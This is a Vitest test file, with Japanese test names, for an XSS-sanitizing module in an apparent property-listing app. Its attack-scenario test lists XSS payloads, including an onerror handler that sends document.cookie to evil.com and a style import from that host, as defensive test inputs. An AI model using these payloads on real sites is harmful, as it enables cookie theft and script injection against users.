import { describe, test, expect } from 'vitest';
import {
  escapeHtml,
  sanitizePropertyInput,
  sanitizeLongText,
  displaySafeText
} from '../sanitize';

describe('sanitize - SEC-015 物件名・場所フィールドXSS対策', () => {
  describe('escapeHtml', () => {
    test('HTMLの特殊文字をエスケープする', () => {
      expect(escapeHtml('<script>alert("XSS")</script>')).toBe('&lt;script&gt;alert(&quot;XSS&quot;)&lt;&#x2F;script&gt;');
      expect(escapeHtml('Tom & Jerry')).toBe('Tom &amp; Jerry');
      expect(escapeHtml('"Hello"')).toBe('&quot;Hello&quot;');
      expect(escapeHtml("It's mine")).toBe('It&#x27;s mine');
      expect(escapeHtml('</div>')).toBe('&lt;&#x2F;div&gt;');
    });

    test('空の入力を処理する', () => {
      expect(escapeHtml('')).toBe('');
      expect(escapeHtml(null as any)).toBe('');
      expect(escapeHtml(undefined as any)).toBe('');
    });

    test('通常のテキストはそのまま返す', () => {
      expect(escapeHtml('東京都渋谷区神宮前1-1-1')).toBe('東京都渋谷区神宮前1-1-1');
      expect(escapeHtml('カーサ○○マンション')).toBe('カーサ○○マンション');
    });
  });

  describe('sanitizePropertyInput', () => {
    test('スクリプトタグを除去する', () => {
      const input = '品川区<script>alert("XSS")</script>投資物件';
      expect(sanitizePropertyInput(input)).toBe('品川区投資物件');
    });

    test('イベントハンドラを除去する', () => {
      const input = '<div onclick="alert(\'XSS\')">物件名</div>';
      expect(sanitizePropertyInput(input)).toBe('物件名');
    });

    test('危険なタグを除去する', () => {
      expect(sanitizePropertyInput('<iframe src="evil.com"></iframe>物件')).toBe('物件');
      expect(sanitizePropertyInput('物件<object data="evil.swf"></object>')).toBe('物件');
      expect(sanitizePropertyInput('<embed src="evil.swf">物件')).toBe('物件');
    });

    test('HTMLコメントを除去する', () => {
      const input = '物件名<!-- 悪意のあるコメント -->です';
      expect(sanitizePropertyInput(input)).toBe('物件名です');
    });

    test('制御文字を除去する', () => {
      const input = '物件名\x00\x08\x0B\x0C\x1F';
      expect(sanitizePropertyInput(input)).toBe('物件名');
    });

    test('連続する空白を1つにする', () => {
      const input = '物件名    スペース    多い';
      expect(sanitizePropertyInput(input)).toBe('物件名 スペース 多い');
    });

    test('最大文字数を制限する', () => {
      const longInput = 'あ'.repeat(250);
      const result = sanitizePropertyInput(longInput);
      expect(result.length).toBe(200);
    });

    test('正常な物件名・住所は変更しない', () => {
      expect(sanitizePropertyInput('カーサ○○マンション')).toBe('カーサ○○マンション');
      expect(sanitizePropertyInput('東京都渋谷区神宮前1-1-1')).toBe('東京都渋谷区神宮前1-1-1');
      expect(sanitizePropertyInput('品川区投資物件2023')).toBe('品川区投資物件2023');
    });
  });

  describe('sanitizeLongText', () => {
    test('基本的なサニタイゼーションを行う', () => {
      const input = 'メモ<script>alert("XSS")</script>です';
      expect(sanitizeLongText(input)).toBe('メモです');
    });

    test('連続する改行を2つまでに制限する', () => {
      const input = 'メモ1\n\n\n\n\nメモ2';
      expect(sanitizeLongText(input)).toBe('メモ1\n\nメモ2');
    });

    test('最大文字数を制限する（デフォルト1000文字）', () => {
      const longInput = 'あ'.repeat(1500);
      const result = sanitizeLongText(longInput);
      expect(result.length).toBe(1000);
    });

    test('カスタム最大文字数を設定できる', () => {
      const longInput = 'あ'.repeat(600);
      const result = sanitizeLongText(longInput, 500);
      expect(result.length).toBe(500);
    });

    test('改行を含む正常なメモは保持する', () => {
      const input = '物件の特徴:\n- 駅近\n- 南向き\n- リノベーション済み';
      const expected = '物件の特徴:\n- 駅近\n- 南向き\n- リノベーション済み';
      expect(sanitizeLongText(input)).toBe(expected);
    });
  });

  describe('displaySafeText', () => {
    test('escapeHtmlを適用する', () => {
      expect(displaySafeText('<b>太字</b>')).toBe('&lt;b&gt;太字&lt;&#x2F;b&gt;');
      expect(displaySafeText('正常なテキスト')).toBe('正常なテキスト');
    });
  });

  describe('実際の攻撃シナリオ', () => {
    test('XSS攻撃の試みを防ぐ', () => {
      const attacks = [
        '<img src=x onerror="alert(\'XSS\')">',
        '<svg onload="alert(\'XSS\')">',
        'javascript:alert("XSS")',
        '<script>document.cookie</script>',
        '<iframe src="data:text/html,<script>alert(\'XSS\')</script>"></iframe>',
        '"><script>alert(String.fromCharCode(88,83,83))</script>',
        '<img src="x" onerror="this.src=\'http://evil.com/steal?cookie=\'+document.cookie">',
        '<style>@import "http://evil.com/evil.css";</style>'
      ];

      attacks.forEach(attack => {
        const sanitized = sanitizePropertyInput(attack);
        expect(sanitized).not.toContain('<script');
        expect(sanitized).not.toContain('javascript:');
        expect(sanitized).not.toContain('onerror');
        expect(sanitized).not.toContain('onload');
        expect(sanitized).not.toContain('<iframe');
        expect(sanitized).not.toContain('<style');
      });
    });

    test('正当な不動産物件名を保持する', () => {
      const legitNames = [
        'ライオンズマンション品川',
        'パークハウス渋谷WEST',
        'サンシティ池袋2号館',
        'メゾン・ド・ヴィレ恵比寿',
        '青山タワーレジデンス3F',
        'グランドメゾン六本木ヒルズ'
      ];

      legitNames.forEach(name => {
        expect(sanitizePropertyInput(name)).toBe(name);
      });
    });

    test('正当な住所を保持する', () => {
      const legitAddresses = [
        '東京都港区六本木1-2-3',
        '神奈川県横浜市中区山下町123-4',
        '大阪府大阪市北区梅田2丁目5-6',
        '京都府京都市左京区銀閣寺町10',
        '北海道札幌市中央区大通西4丁目1番地'
      ];

      legitAddresses.forEach(address => {
        expect(sanitizePropertyInput(address)).toBe(address);
      });
    });
  });
});